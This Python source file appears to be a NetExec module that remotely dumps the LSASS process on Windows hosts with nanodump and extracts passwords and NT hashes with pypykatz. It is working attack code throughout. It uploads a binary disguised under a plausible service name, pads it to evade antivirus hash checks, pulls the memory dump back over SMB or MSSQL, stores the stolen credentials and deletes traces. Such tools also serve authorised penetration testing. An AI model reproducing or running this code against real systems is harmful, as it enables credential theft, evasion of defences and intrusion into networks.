# nanodump module for nxc python3
# author of the module : github.com/mpgn
# nanodump: https://github.com/helpsystems/nanodump

import os
import base64
import sys
import random
from pypykatz.pypykatz import pypykatz
import tempfile
from datetime import datetime
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.misc import CATEGORY, PLAUSIBLE_SERVICE_NAMES
from nxc.protocols.mssql.mssqlexec import MSSQLEXEC


class NXCModule:
    name = "nanodump"
    description = "Get lsass dump using nanodump and parse the result with pypykatz"
    supported_protocols = ["smb", "mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.connection = None
        self.dir_result = None
        self.remote_tmp_dir = None
        self.useembeded = None
        self.nano = None
        self.nano_path = None
        self.nano_embedded64 = None
        self.tmp_share = None
        self.share = None
        self.context = context
        self.module_options = module_options

    def _load_blob_file(self, filename):
        """Load binary blob from data directory."""
        # Get the directory of the current module file
        module_dir = os.path.dirname(os.path.abspath(__file__))
        # Go up one level to nxc directory, then into data
        blob_path = os.path.join(os.path.dirname(module_dir), "data", filename)
        
        try:
            with open(blob_path, "rb") as f:
                return f.read()
        except FileNotFoundError:
            raise FileNotFoundError(f"Could not find blob file: {blob_path}")

    def _generate_plausible_name(self):
        """Generate a plausible service name with timestamp."""
        service_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        timestamp = datetime.now().strftime("%Y%m%d")
        return f"{service_name}_{timestamp}.exe"

    def options(self, context, module_options):
        r"""
        TMP_DIR             Path where process dump should be saved on target system (default: C:\\Users\\Public\\Documents\\)
        NANO_PATH           Path where nano.exe is on your system (default: OS temp directory)
        NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
        """
        # Use a more standard path that works with SMB shares
        self.remote_tmp_dir = "C:\\Users\\Public\\Documents\\"
        self.share = "C$" 
        self.tmp_share = "Users\\Public\\Documents\\"
        self.nano_embedded64 = self._load_blob_file("x64.blob")
        self.nano_embedded32 = self._load_blob_file("x32.blob")
        self.nano = self._generate_plausible_name()
        self.nano_path = ""
        self.useembeded = True
        # Add some random binary data to defeat AVs which check the file hash
        padding = datetime.now().strftime("%Y%m%d%H%M%S").encode()
        self.nano_embedded64 += padding
        self.nano_embedded32 += padding

        if "NANO_PATH" in module_options:
            self.nano_path = module_options["NANO_PATH"]
            self.useembeded = False
        else:
            self.nano_path = f"{tempfile.gettempdir()}"
        self.dir_result = self.nano_path

        if "NANO_EXE_NAME" in module_options:
            self.nano = module_options["NANO_EXE_NAME"]
            self.useembeded = False

        if "TMP_DIR" in module_options:
            self.remote_tmp_dir = module_options["TMP_DIR"]

        if "DIR_RESULT" in module_options:
            self.dir_result = module_options["DIR_RESULT"]

    def on_admin_login(self, context, connection):
        self.connection = connection
        self.context = context
        if self.useembeded:
            with open(os.path.join(self.nano_path, self.nano), "wb") as nano:
                if self.connection.os_arch == 32 and self.context.protocol == "smb":
                    self.context.log.display("32-bit Windows detected.")
                    nano.write(self.nano_embedded32)
                elif self.connection.os_arch == 64 and self.context.protocol == "smb":
                    self.context.log.display("64-bit Windows detected.")
                    nano.write(self.nano_embedded64)
                elif self.context.protocol == "mssql":
                    nano.write(self.nano_embedded64)
                else:
                    self.context.log.fail("Unsupported Windows architecture")
                    sys.exit(1)

        if self.context.protocol == "smb":
            with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                try:
                    self.connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
                    self.context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}")
                except Exception as e:
                    # Check if file was actually uploaded despite timeout
                    self.context.log.display(f"Upload timeout occurred, checking if file exists: {e}")
                    try:
                        # Try to list the file to see if it exists
                        files = self.connection.conn.listPath(self.share, self.tmp_share)
                        file_exists = any(f.filename == self.nano for f in files)
                        if file_exists:
                            self.context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share} (recovered from timeout)")
                        else:
                            self.context.log.fail(f"File upload failed - file does not exist: {e}")
                            return
                    except Exception as list_error:
                        self.context.log.fail(f"Cannot verify file upload and cannot list directory: {e}")
                        return
        else:
            with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                try:
                    self.context.log.display(f"Copy {self.nano} to {self.remote_tmp_dir}")
                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                    exec_method.put_file(nano.read(), self.remote_tmp_dir + self.nano)
                    if exec_method.file_exists(self.remote_tmp_dir + self.nano):
                        self.context.log.success(f"Created file {self.nano} on the remote machine {self.remote_tmp_dir}")
                    else:
                        self.context.log.fail("File does not exist on the remote system... error during upload")
                        sys.exit(1)
                except Exception as e:
                    self.context.log.fail(f"Error writing file to remote machine directory {self.remote_tmp_dir}: {e}")

        # Wait for Windows Defender review prompt to be dismissed
        import time
        self.context.log.display("Waiting 30 seconds for Windows Defender review prompt...")
        time.sleep(30)

        # apparently SMB exec methods treat the output parameter differently than MSSQL (we use it to display())
        # if we don't do this, then SMB doesn't actually return the results of commands, so it appears that the
        # execution fails, which it doesn't
        display_output = self.context.protocol == "smb"
        self.context.log.debug(f"Display Output: {display_output}")
        # Skip PID detection - let nanodump auto-detect LSASS process
        self.context.log.display("Using nanodump auto-detection for LSASS process")
        timestamp = datetime.today().strftime("%Y%m%d_%H%M")
        service_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        nano_log_name = f"{service_name}_{timestamp}.log"
        command = f"{self.remote_tmp_dir}{self.nano} --write {self.remote_tmp_dir}{nano_log_name}"
        self.context.log.display(f"Executing command {command}")

        p = self.connection.execute(command, display_output)
        self.context.log.debug(f"NanoDump Command Result: {p}")

        if not p or p == "None":
            self.context.log.fail("Failed to execute command to execute NanoDump")
            self.delete_nanodump_binary()
            return

        # results returned are different between SMB and MSSQL
        full_results = " ".join(p) if self.context.protocol == "mssql" else p

        if "Done" in full_results:
            self.context.log.success("Process lsass.exe was successfully dumped")
            dump = True
        else:
            self.context.log.fail("Process lsass.exe error on dump, try with verbose")
            dump = False

        if not dump:
            self.delete_nanodump_binary()
            return
        else:
            self.context.log.display(f"Copying {nano_log_name} to host")
            filename = os.path.join(self.dir_result, f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
            if self.context.protocol == "smb":
                with open(filename, "wb+") as dump_file:
                    try:
                        self.connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
                        self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                    except Exception as e:
                        self.context.log.fail(f"Error while getting file: {e}")

                try:
                    self.connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
                    self.context.log.success(f"Deleted nano file on the {self.share} share")
                except Exception as e:
                    self.context.log.fail(f"Error deleting nano file on share {self.share}: {e}")

                try:
                    self.connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
                    self.context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
                except Exception as e:
                    self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
            else:
                try:
                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                    exec_method.get_file(self.remote_tmp_dir + nano_log_name, filename)
                    self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                except Exception as e:
                    self.context.log.fail(f"Error while getting file: {e}")

                self.delete_nanodump_binary()

                try:
                    self.connection.execute(f"del {self.remote_tmp_dir + nano_log_name}")
                    self.context.log.success(f"Deleted lsass.dmp file on the {self.remote_tmp_dir} dir")
                except Exception as e:
                    self.context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on dir {self.remote_tmp_dir}: {e}")

            with open(filename, "r+b") as fh:  # needs the "r+b", not "rb" like below
                fh.seek(0)
                fh.write(b"\x4d\x44\x4d\x50")
                fh.seek(4)
                fh.write(b"\xa7\x93")
                fh.seek(6)
                fh.write(b"\x00\x00")

            with open(filename, "rb") as dump:
                try:
                    bh_creds = []
                    try:
                        pypy_parse = pypykatz.parse_minidump_external(dump)
                    except Exception as e:
                        pypy_parse = None
                        self.context.log.fail(f"Error parsing minidump: {e}")

                    ssps = [
                        "msv_creds",
                        "wdigest_creds",
                        "ssp_creds",
                        "livessp_creds",
                        "kerberos_creds",
                        "credman_creds",
                        "tspkg_creds",
                    ]

                    for luid in pypy_parse.logon_sessions:
                        for ssp in ssps:
                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                                domain = getattr(cred, "domainname", None)
                                username = getattr(cred, "username", None)
                                password = getattr(cred, "password", None)
                                NThash = getattr(cred, "NThash", None)
                                if NThash is not None:
                                    NThash = NThash.hex()
                                if username and (password or NThash) and "$" not in username:
                                    if password:
                                        credtype = "password"
                                        credential = password
                                    else:
                                        credtype = "hash"
                                        credential = NThash
                                    self.context.log.highlight(f"{domain}\\{username}:{credential}")
                                    host_id = self.context.db.get_hosts(self.connection.host)[0][0]
                                    self.context.db.add_credential(
                                        credtype,
                                        connection.domain,
                                        username,
                                        credential,
                                        pillaged_from=host_id,
                                    )
                                    if "." not in domain and domain.upper() in self.connection.domain.upper():
                                        domain = self.connection.domain
                                        bh_creds.append(
                                            {
                                                "username": username.upper(),
                                                "domain": domain.upper(),
                                            }
                                        )
                    if len(bh_creds) > 0:
                        add_user_bh(bh_creds, None, self.context.log, self.connection.config)
                except Exception as e:
                    self.context.log.fail(f"Error opening dump file: {e}")

    def delete_nanodump_binary(self):
        try:
            self.connection.execute(f"del {self.remote_tmp_dir + self.nano}")
            self.context.log.success(f"Deleted nano file on the {self.share} dir")
        except Exception as e:
            self.context.log.fail(f"[OPSEC] Error deleting nano file on dir {self.remote_tmp_dir}: {e}")
